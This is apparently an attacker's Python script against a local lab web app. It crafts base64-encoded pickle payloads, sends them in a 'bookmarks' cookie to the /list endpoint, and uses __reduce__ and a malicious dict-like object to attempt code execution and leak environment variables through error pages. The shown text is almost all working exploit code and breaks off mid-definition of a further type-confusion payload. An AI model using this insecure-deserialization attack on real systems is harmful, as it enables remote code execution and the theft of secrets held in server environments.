import requests
import pickle
import base64

target_url = "http://127.0.0.1:32962"
headers = {"User-Agent": "Mozilla/5.0"}

# Test with actual valid bookmark data to understand format
# Based on the app, bookmarks is a list of dicts with 'url' and 'name' keys

# Create a valid-looking bookmark structure
valid_bookmark = [
    {"name": "Test", "url": "http://example.com"}
]

pickled_valid = pickle.dumps(valid_bookmark, protocol=4)
encoded_valid = base64.b64encode(pickled_valid).decode()
print(f"[*] Valid bookmark payload: {encoded_valid}")

response = requests.get(f"{target_url}/list", cookies={"bookmarks": encoded_valid}, headers=headers)
print(f"[*] Status with valid payload: {response.status_code}")
print(f"[*] Response contains example.com? {'example.com' in response.text}")

# Now create an object that when used as a bookmark causes RCE
# The app likely iterates and accesses bookmark['url'] and bookmark['name']

class MaliciousBookmark:
    """A dict-like object that triggers RCE when accessed"""
    def __getitem__(self, key):
        import os
        # Raise exception containing environment
        raise RuntimeError(f"RCE_TRIGGERED: {dict(os.environ)}")
    
    def __iter__(self):
        return iter(['url', 'name'])
    
    def keys(self):
        return ['url', 'name']

class PayloadMaliciousBookmark:
    def __reduce__(self):
        return (list, ([MaliciousBookmark()],))

try:
    pickled = pickle.dumps(PayloadMaliciousBookmark(), protocol=4)
    encoded = base64.b64encode(pickled).decode()
    print(f"\n[*] Malicious bookmark payload: {encoded}")
    
    response = requests.get(f"{target_url}/list", cookies={"bookmarks": encoded}, headers=headers, timeout=5)
    print(f"[*] Status: {response.status_code}")
    
    if response.status_code == 500:
        print(f"[!] 500 ERROR - Exploit worked!")
        print(response.text[:3000])
    else:
        # Check if there's any trace of our exploit in the response
        if "RCE" in response.text or "RuntimeError" in response.text or "Traceback" in response.text:
            print(f"[!] EXPLOIT SIGNATURE FOUND!")
            print(response.text[:2000])
        else:
            print(f"[*] Response: {response.text[:500]}")
except Exception as e:
    print(f"[*] Error creating payload: {e}")

# Try with type confusion - return something that's not iterable when list expects it
class NonIterable:
    pass

class PayloadNonIterable:
    def __reduce__(self):
